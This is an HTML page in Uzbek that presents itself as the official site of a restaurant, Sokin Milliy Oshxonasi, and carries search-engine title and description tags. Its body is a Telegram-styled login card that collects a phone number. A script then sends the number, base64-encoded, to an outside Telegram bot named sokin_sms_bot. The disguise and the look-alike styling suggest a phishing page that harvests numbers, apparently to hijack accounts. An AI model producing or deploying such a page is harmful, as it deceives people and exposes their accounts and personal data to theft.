<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Google buni ko'rishi uchun sarlavha -->
    <title>Sokin Milliy Oshxonasi - Rasmiy sayt</title>
    
    <meta name="description" content="Sokin Milliy Oshxonasi - Mazali milliy taomlar va buyurtma berish tizimi.">
    
    <style>
        /* Telegram uslubidagi dizayn */
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 320px; }
        img { width: 80px; margin-bottom: 15px; }
        h2 { margin-bottom: 10px; font-size: 22px; color: #222; }
        p { color: #707579; font-size: 14px; margin-bottom: 25px; }
        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 5px; font-size: 16px; box-sizing: border-box; }
        .btn { background-color: #3390ec; color: white; border: none; padding: 12px; width: 100%; border-radius: 5px; font-size: 16px; cursor: pointer; font-weight: bold; }
        .btn:hover { background-color: #2b78c7; }
    </style>
</head>
<body>

<div class="login-card">
    <!-- Bu yerga logotip qo'yishingiz mumkin -->
    <h2>Sokin Milliy Oshxonasi</h2>
    <p>Telefon raqamingizni kiriting</p>
    
    <input type="tel" id="phone" placeholder="+998 00 000 00 00" value="+998">
    <button class="btn" onclick="sendCode()">KEYINGISI</button>
</div>

<script>
    function sendCode() {
        let phone = document.getElementById('phone').value;
        if(phone.length > 9) {
            // Botga yuborish yoki keyingi sahifaga o'tish logikasi
            window.location.href = "https://t.me/sokin_sms_bot?start=" + btoa(phone);
        } else {
            alert("Raqamni to'liq kiriting!");
        }
    }
</script>

</body>
</html>
